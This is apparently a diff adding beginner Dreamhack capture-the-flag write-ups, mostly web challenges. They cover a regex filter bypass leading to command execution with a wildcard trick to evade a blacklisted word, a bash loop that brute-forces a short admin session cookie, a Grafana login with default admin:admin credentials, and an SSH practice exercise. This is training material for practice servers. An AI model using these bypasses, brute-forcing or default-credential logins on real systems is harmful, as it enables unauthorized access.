@@ -204,6 +204,225 @@ looking at the source code, it shows that the /get\_user is currently in /api/us
 
 ***
 
+### phpreg
+
+This page is written in php.
+
+Enter the appropriate Nickname and Password and you can proceed to Step 2.
+
+Use the `system()` function in Step 2 to obtain flags.
+
+The flag is `../dream/flag.txt` located at.
+
+The format of the flag is DH {...} That's it.
+
+The goal is to bypass login and read flag
+
+```php
+$input_name = $_POST["input1"] ? $_POST["input1"] : "";
+$input_pw   = $_POST["input2"] ? $_POST["input2"] : "";
+
+// pw filtering
+if (preg_match("/[a-zA-Z]/", $input_pw)) {
+  echo "alphabet in the pw :(";
+}
+else {
+  $name = preg_replace("/nyang/i", "", $input_name);
+  $pw   = preg_replace("/\d*\@\d{2,3}(31)+[^0-8\"]\!/", "d4y0r50ng", $input_pw);
+
+  if ($name === "dnyang0310" && $pw === "d4y0r50ng+1+13") {
+    // Step 2 with system($cmd)
+  }
+}
+```
+
+from the source code we know that the server check for `dnyang0310:d4y0r50ng+1+13`
+
+but the code remove `nyang`. so we use trick like path traversal ....// which remove ../ so we input dnynyangang0310.&#x20;
+
+as for the password, we need to satisfy the regex `"/\d*\@\d{2,3}(31)+[^0-8\"]\!/"` because it will replace with `d4y0r50ng`, whihc needed in the real password. So its more like `"/\d*\@\d{2,3}(31)+[^0-8\"]\!/"+1+13`
+
+the regex means:
+
+* `\d*` – 0 or more digits
+* `@` – literal `@`
+* `\d{2,3}` – 2 or 3 digits
+* `(31)+` – one or more `"31"`
+* `[^0-8\"]` – a single char that is **not** `0–8` or `"`
+* `!` – literal `!`
+
+So we can use `0@00319!`
+
+* `0` → `\d*`
+* `@` → `@`
+* `00` → part of `\d{2,3}`
+* `31` → `(31)+`
+* `9` → `[^0-8\"]` (9 is allowed, not in 0–8)
+* `!` → `!`
+* `+1+13` → remains untouched, outside the match
+
+Then after login, we actually get system($cmd); or RCE, so we just need to cat flag. but flag is blacklisted. we can bypass it using wildcard f?ag.
+
+***
+
+### Flying chars
+
+Stop the flying letters and figure out the whole string! The flag format is DH {full string}.
+
+❗ The problem is that attachments are not provided.\
+❗ Of the letters included in the flag`x`,,`s`, `o` are all lowercase letters.\
+❗ All alphabets included in the flag `C` are capital letters.
+
+Since there are no source code, it approach this as blackbox challenge. Looking at the website, it literally has flying chars which impossible to see with human eyes.
+
+Taking a look at curl
+
+```bash
+$ curl -v http://host8.dreamhack.games:11018/
+* Host host8.dreamhack.games:11018 was resolved.
+* IPv6: (none)
+* IPv4: 158.247.232.53
+*   Trying 158.247.232.53:11018...
+* Connected to host8.dreamhack.games (158.247.232.53) port 11018
+* using HTTP/1.x
+> GET / HTTP/1.1
+> Host: host8.dreamhack.games:11018
+> User-Agent: curl/8.11.0
+> Accept: */*
+>
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: Werkzeug/2.3.4 Python/3.11.1
+< Date: Sat, 22 Nov 2025 16:32:33 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 1634
+< Connection: close
+<
+<html>
+<head>
+  <title>Web</title>
+</head>
+<body>
+  <div id="box">
+  </div>
+
+  <style type="text/css">
+    body{
+      display: flex;
+      width: 100vw;
+      height:100vh;
+      padding: 0px;
+
+    }
+    #box{
+      display: flex;
+      flex-direction: column;
+      justify-content: space-around;
+      width: 90%;
+      height:100%;
+    }
+  </style>
+
+  <script type="text/javascript">
+    const img_files = ["/static/images/10.png", "/static/images/17.png", "/static/images/13.png", "/static/images/7.png","/static/images/16.png", "/static/images/8.png", "/static/images/14.png", "/static/images/2.png", "/static/images/9.png", "/static/images/5.png", "/static/images/11.png", "/static/images/6.png", "/static/images/12.png", "/static/images/3.png", "/static/images/0.png", "/static/images/19.png", "/static/images/4.png", "/static/images/15.png", "/static/images/18.png", "/static/images/1.png"];
+    var imgs = [];
+    for (var i = 0; i < img_files.length; i++){
+      imgs[i] = document.createElement('img');
+      imgs[i].src = img_files[i];
+      imgs[i].style.display = 'block';
+      imgs[i].style.width = '10px';
+      imgs[i].style.height = '10px';
+      document.getElementById('box').appendChild(imgs[i]);
+    }
+
+    const max_pos = self.innerWidth;
+    function anim(elem, pos, dis){
+      function move() {
+        pos += dis;
+        if (pos > max_pos) {
+          pos = 0;
+        }
+        elem.style.transform = `translateX(${pos}px)`;
+        requestAnimationFrame(move);
+      }
+      move();
+    }
+
+    for(var i = 0; i < 20; i++){
+      anim(imgs[i], 0, Math.random()*60+20);
+    }
+  </script>
+</body>
+* shutting down connection #0
+</html>
+```
+
+for me, i'll take a look one by one oin img\_files value. /static/images/10.png is letter T. check the image one by one and get the flag. Too\_H4rd\_to\_sEe\_th3\_Ch4rs\_X.X
+
+Then we change the strings to match the challenge description
+
+***
+
+### simple-web-request
+
+When you reach the FLAG page after STEP 1-2, the flag is output.\
+Earn flags by passing all levels. The flags are in the flag.txt file and in the FLAG variable.
+
+The flag format is DH {...} This is it.
+
+to pass step 1, the are are hardcoded passphrase in the code
+
+[/step1?param=getget\&param2=rerequest](http://host8.dreamhack.games:18568/step1?param=getget\&param2=rerequest)
+
+the same as step 2, there are hardcoded value
+
+pooost and requeeest
+
+***
+
+### session
+
+A simple login service that uses cookies and sessions to manage authentication status.\
+If you successfully log in with an admin account, you can obtain a flag.
+
+From the source code, we can login with guest:guest
+
+Taking a look at session cookie, i dont think we can alter it as they are no meaningful value behind it. So we will just brute force the admin session as the token is really short.
+
+```bash
+#!/usr/bin/env bash
+
+URL="http://host8.dreamhack.games:12380/"
+
+for i in $(printf "%02x " {0..255}); do
+    echo "[*] Trying sessionid=$i"
+    # -s = silent, -S = show errors, -L = follow redirects if any
+    body=$(curl -s -S -L "$URL/" --cookie "sessionid=$i")
+    if echo "$body" | grep -q "Hello admin"; then
+        echo "[+] FOUND admin sessionid: $i"
+        echo "$body"
+        break
+    fi
+done
+```
+
+***
+
+### web-misconf-1
+
+This service uses default settings.\
+After I logged in, I set a flag for the organization.
+
+the description mention about default settings.
+
+running the web shows grafana login page.&#x20;
+
+googling it and google give admin:admin
+
+then just explore the page adn found flag
+
+***
+
 ## Misc
 
 ### 64se64
@@ -253,7 +472,67 @@ ls ./dream/hack/hello and found flag.txt. but from app.py we can see the word "f
 
 ***
 
-## reversing
+### Exercise: SSH
+
+This is a question for SSH practice. Connect to the problem server via SSH!
+
+The format of the flag is DH {...} That's it.
+
+```
+ssh with
+id: chall
+password: dhbgssh
+```
+
+just read the flag
+
+```bash
+$ ssh -p 18826 chall@host8.dreamhack.games
+The authenticity of host '[host8.dreamhack.games]:18826 ([158.247.232.53]:18826)' can't be established.
+ED25519 key fingerprint is SHA256:xhAn3bi+kzaaA1iGfdWEqxlXIHfGg8F0iJuyKHulTXw.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[host8.dreamhack.games]:18826' (ED25519) to the list of known hosts.
+chall@host8.dreamhack.games's password:
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 4.19.234 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+rbash: groups: command not found
+rbash: dircolors: command not found
+chall@localhost:~$ ls
+bin  flag
+chall@localhost:~$ file flag
+rbash: file: command not found
+chall@localhost:~$ cat flag
+DH{h3110_6e9inn3rs!}
+```
+
+***
+
+### dreamhack-tools-cyberchef
+
+Dream is very sad because nobody knows about [https://tools.dreamhack.games/cyberchef](https://tools.dreamhack.games/cyberchef) created by Dream. Shall we try it together?
+
+the challenge file shows how the flag be encoded. just reverse the encoding in cyberchef
+
+***
+
+## Reversing
 
 ### Reversing Basic Challenge #0 <a href="#reversing-basic-challenge-0" id="reversing-basic-challenge-0"></a>
 
